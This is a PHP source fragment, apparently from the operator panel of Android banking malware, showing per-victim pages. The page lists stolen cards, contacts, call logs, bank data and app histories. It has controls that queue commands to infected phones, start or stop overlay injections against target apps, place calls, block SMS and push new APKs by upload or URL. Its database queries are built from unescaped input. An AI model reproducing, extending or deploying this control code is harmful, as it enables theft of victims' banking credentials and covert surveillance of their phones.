							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=cards';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=cards';\">Export</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#cardrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 13,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
					</div>
					
					";
				/////////////////////////////////////////////////////////////////line 3	
					$line3 .= "
					<br>
					<div class=\"row\">
						<div class=\"col-lg-4\">
							<h3>Injections</h3>
							";
							
							$bapps = get_apps_bot($bid);
							$appsInj = get_list_injects();
							$find_inj = array_intersect_key($bapps,$appsInj);
							if(count($find_inj)>0){
								foreach($find_inj as $key=>$fi){
									$line3 .= "<a href=\"list.php?op=filter_app&name=".$key."\">".$key. "</a><br>";
								}
							}else{
								$line3 .= "none";
							}
							
							$line3 .="<br>
							<button type=\"button\" class=\"btn btn-success\" onclick=\"location.href='bot.php?id=".$bid."&op=showform&query=makeinject';\">Request manual</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='bot.php?id=".$bid."&op=startinject';\">Start</button>
							<button type=\"button\" class=\"btn btn-danger\" onclick=\"location.href='bot.php?id=".$bid."&op=stopinject';\">Stop</button>
							<button type=\"button\" class=\"btn btn-success\">Show datas</button>
						</div>
						<div class=\"col-lg-4\">
							<h3>Last files</h3>
							no data
							<button type=\"button\" class=\"btn btn-success\" id=\"filemanagerrequest\">Request</button>
							<button type=\"button\" class=\"btn\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\">Export</button>
							
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								//cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#filemanagerrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 29,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
						<div class=\"col-lg-4\">
							<h3>Contacts</h3>
							";
							
							$res = $dbm->query("select * from contacts where bot_id='".$bid."' ORDER BY id DESC LIMIT 10");
							if($dbm->count>0){
								$count = 0;
								while($row=mysqli_fetch_array($res)) {
									$line3 .= "<p class=\"bg-info\">".$row[2] . " - ".$row[3]."</p>";
								}
							}else{
								$line3 .= "none";
							}
							
							$line3 .= "
							<button type=\"button\" class=\"btn btn-success\" id=\"contactsrequest\">Request</button>
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=contacts';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=contacts';\">Export</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								//cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#contactsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 2,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
					</div>
					
					";
			//////////////////////////////////////////////////////line 4		
					$line4 .= "
					<br>
					<div class=\"row\">
						<div class=\"col-lg-4\">
							<h3>Banks</h3>
							no data
							<button type=\"button\" class=\"btn\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\">Export</button>
						</div>
						<div class=\"col-lg-4\">
							<h3>Photos</h3>
							no data
							<button type=\"button\" class=\"btn\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\">Export</button>
						</div>
						<div class=\"col-lg-4\">
							<h3>Calls</h3>
							";
							
							$res = $dbm->query("select * from calls where bot_id='".$bid."' ORDER BY id DESC LIMIT 10");
							if($dbm->count>0){
								$count = 0;
								while($row=mysqli_fetch_array($res)) {
									$sql = "select * from contacts where id='".$row[2]."'";
									$resc = $dbm->query($sql);
									while($rowc=mysqli_fetch_array($resc)) {
										$name = $rowc[2];
										$number = $rowc[3];
									}
									if($row['call_type']==1){
										$line4 .= "<p class=\"bg-primary\"><- ";
									}
									if($row['call_type']==2){
										$line4 .= "<p class=\"bg-success\">-> ";
									}
									if($row['call_type']==3){
										$line4 .= "<p class=\"bg-warning\">??? ";
									}
									$line4 .= $name."(".$number.") - ".new_time(round($row[4]/1000))."</p>";
								}
							}else{
								$line4 .= "none";
							}
							
							$line4 .="
							<br><button type=\"button\" class=\"btn btn-success\" onclick=\"location.href='bot.php?id=".$bid."&op=showform&query=makecall';\">Make call</button>
							<button type=\"button\" class=\"btn btn-success\" id=\"callsrequest\" >Request</button>
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=calls';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=calls';\">Export</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								//cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#callsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 14,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
					</div>";
					///////////////////////////////////////line 5
					
					$line5 .= "
					<br>
					<div class=\"row\">
						<div class=\"col-lg-4\">
							<h3>Browser history</h3>
							no data
							<button type=\"button\" class=\"btn\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\">Export</button>
						</div>
						<div class=\"col-lg-4\">
							<h3>History uses apps</h3>
							";
							
							$res = $dbm->query("select * from apps_logs where bid='".$bid."' ORDER BY id DESC LIMIT 10");
							if($dbm->count>0){
								$count = 0;
								while($row=mysqli_fetch_array($res)) {		
									$line5 .= "<a href=\"list.php?op=filter_app&name=".$row[2]."\">".$row[2] . "</a> - ".new_time($row[4])."<br>";
								}
							}else{
								$line5 .= "none";
							}
							
							$line5 .="
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=historyapps';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=historyapps';\">Export</button>
						</div>
						
						
						<div class=\"col-lg-4\">
							<h3>APK Loader</h3>
								<form method=post action=\"\" enctype = \"multipart/form-data\">
									<div class=\"form-group\">
										<label>Select file: </label>
										<input class=\"form-control\" type=\"file\" id=\"myfile\" />
									</div>
									<div class=\"form-group\">
										<div class=\"progress\">
											<div class=\"progress-bar progress-bar-success myprogress\" role=\"progressbar\" style=\"width:0%\">0%</div>
										</div>
				 
										<div class=\"msg\"></div>
									</div>
				 
									<input type=\"button\" id=\"btn\" class=\"btn-success\" value=\"Upload\" />
								</form>
								<script>
									$(function () {
										$('#btn').click(function () {
											$('.myprogress').css('width', '0');
											$('.msg').text('');
											var filename = $('#filename').val();
											var myfile = $('#myfile').val();
											if (filename == '' || myfile == '') {
												alert('Please enter file name and select file');
												return;
											}
											var formData = new FormData();
											formData.append('myfile', $('#myfile')[0].files[0]);
											formData.append('filename', filename);
											formData.append('op', 8);
											formData.append('noref', 'true');
											formData.append('bid', '".$bid."');
											$('#btn').attr('disabled', 'disabled');
											$('.msg').text('Uploading in progress...');
											$.ajax({
												url: 'bot.php',
												data: formData,
												processData: false,
												contentType: false,
												type: 'POST',
												// this part is progress bar
												xhr: function () {
													var xhr = new window.XMLHttpRequest();
													xhr.upload.addEventListener(\"progress\", function (evt) {
														if (evt.lengthComputable) {
															var percentComplete = evt.loaded / evt.total;
															percentComplete = parseInt(percentComplete * 100);
															$('.myprogress').text(percentComplete + '%');
															$('.myprogress').css('width', percentComplete + '%');
														}
													}, false);
													return xhr;
												},
												success: function (data) {
													$('.msg').text(data);
													$('#btn').removeAttr('disabled');
													location.reload();
												},
												error: function (error) {
													// handle error
													$('.msg').text(\"Error uploading\");
													$('#btn').removeAttr('disabled');
												},
											});
										});
									});
								</script>
						</div>
					</div>
					<br><br>
					";
				
				
				$lines = array(
			
					array('SMS, Commands, Basic info',$line1),
					array('Apps, GEO, Cards',$line2),
					array('Injections, Last files, Contacts',$line3),
					array('Banks, Photo, Calls',$line4),
					array('Browser history, History uses apps, Apk loader',$line5),
					
				);
			}else{
				$line1 .="<div class=\"row\">
					<div class=\"col-lg-4\">
						<h3>Last Commands</h3>
						";
						
						$res = $dbm->query("select * from commands where bid='".$bid."' ORDER BY id DESC LIMIT 10");
						if($dbm->count>0){
							$count = 0;
							while($rowc=mysqli_fetch_array($res)) {
								$cs = "";
								if($rowc[5]==0){
									if($rowc[6]==0){
										$cs = "wait";
									}else{
										$cs = "getted";
									}
									
									$line1 .= "<p class=\"bg-info\">".new_time($rowc[4])." - ".$commands[$rowc[2]] ."(".$rowc[2].") - ".$cs."</p>";
									
								}else{
									$cs = "executed";
									$line1 .= "<p class=\"bg-success\">".new_time($rowc[4])." - ".$commands[$rowc[2]] ."(".$rowc[2].") - ".$cs."<p>";
								}
								
							}
						}else{
							$line1 .= "none";
						}
						
						$line1 .= "
						<button type=\"button\" class=\"btn btn-success\">Make command</button>
						<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=commands';\">Show all</button>
						<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=commands';\">Export</button>
					</div>
					<div class=\"col-lg-4\">
						<h3>Bot data info</h3>
						
						
						<script>
						
						function copy(data){
							var inp =document.createElement('input');
							document.body.appendChild(inp);
							inp.value =data;
							inp.select();
							document.execCommand('copy',false);
							inp.remove();
						}
						</script>
						";
						
				foreach ($row as $key => $value) {
					if(!is_numeric($key)){
						
						switch($key){
							case "bid":
								$line1 .= "<b>". $key ."</b> : " .$value;
								$line1 .=" <a href=# onclick=copy('".$value."');><i class=\"fa fa-copy\"></i></a>";
								break;
							case "bot_permission":
								$line1 .="<b>Permissions</b> : ".$value." (";
								if(substr($value,1,1)=="1"){
									$line1 .= "<font color=red><b>blocksms</b></font>,";
								}else{
									$line1 .= "<font color=green><b>smsnonblock</b></font>,";
								}
								if(substr($value,3,1)=="1"){
									$line1 .= "<font color=red><b>wait inject</b></font>,";
								}else{
									$line1 .= "<font color=green><b>free inject</b></font>,";
								}
								
								if(substr($value,7,1)=="1"){
									$line1 .= "<font color=green><b>have urlb</b></font>,";
								}else{
									$line1 .= "<font color=red><b>need urlb</b></font>,";
								}
								$line1 .= ")";
								break;
							case "fav":
								if($value==1){
									$line1 .= "<b>$key</b> : liked bot";
								}else{
									$line1 .= "<b>$key</b> : simple bot";
								}
								break;
							default:
								$line1 .= "<b>$key</b> : $value";
						}
						
						$line1 .="<br>";
					}
				}
				
				
				$line1 .="	</div>
				<div class=\"col-lg-4\">
							<h3>APK Loader</h3>
								<form method=post action=\"\" enctype = \"multipart/form-data\">
									<div class=\"form-group\">
										<label>Url file: </label>
										<input type=hidden name=op value=88>
										<input type=hidden name=bid value=\"".$bid."\">
										<input class=\"form-control\" type=\"text\" name=\"url\" />
									</div>
				 
									<input type=\"submit\" id=\"btn\" class=\"btn-success\" value=\"Upload\" />
								</form>
						</div>
				
				
				</div>
				";
				
				$line2 .= "
					<br>
					<div class=\"row\">
						<div class=\"col-lg-4\">
							<h3>Apps on phone</h3>
							";
							
							$res = $dbm->query("select * from commands where idcom='3' and bid='".$bid."' ORDER BY id DESC LIMIT 1");
							if($dbm->count>0){
								$count = 0;
								while($row=mysqli_fetch_array($res)) {
									//$row[7] = str_replace("\"name\"","name",$row[7]);
									//$row[7] = str_replace("\"dir\"","dir",$row[7]);
									//$row[7] = str_replace("\"activity\"","activity",$row[7]);
									//print_r($row[7]);
									//$aapp = json_encode($row[7]);
									$aapp = json_decode($row[7]);
									//var_dump($aapp);
									
									for($i=0;$i<count($aapp);$i++){
										//var_dump( $aapp[$i]);
										$line2 .= "<a href=\"list.php?op=filter_app&name=".$aapp[$i]->name."\">".$aapp[$i]->name . "</a><br>";
										$count++;
										if($count==10)break;
									}
								
									//echo json_last_error_msg();
									//print_r($aaps);
									//$html .= $row[7];
								}
							}else{
								$line2 .= "none";
							}
							
							$line2 .= "
							<button type=\"button\" class=\"btn btn-success\" id=\"appsrequest\">Request</button>
							<button type=\"button\" class=\"btn\" onclick=\"location.href='bot.php?id=".$bid."&op=showall&query=apps';\">Show all</button>
							<button type=\"button\" class=\"btn btn-warning\" onclick=\"location.href='raw.php?id=".$bid."&query=apps';\">Export</button>
							<script>
							$(document).ready(function($) {
								var cardobj = new Object();
								cardobj.status  = 1;
								var cardjsonString= JSON.stringify(cardobj);

								$(\"#appsrequest\").click(function(e) {
									e.preventDefault();
									$.ajax({
										type: \"POST\",
										url: \"ajax.php\",
										data: { 
											op: \"addcom\",
											bid: \"".$bid."\",
											idcom: 3,
											data: cardjsonString,
										},
										success: function(result) {
											location.reload();  
											//alert('ok');
										},
										error: function(result) {
											alert('error');
										}
									});
									//alert(1);
								});
							});
							</script>
						</div>
						
					</div>
					
					";
				$lines = array(
					array('Basic info',$line1),
					array('Basic info2',$line2)
				);
			}
			}	
			$html .= make_accordion($lines);
		}
		
	
		
		
	}
	
	//geoip_close($gi);
	print_content("Bot base info",$html,$bid);
	//var_dump($line1);
	print_footer();

?>
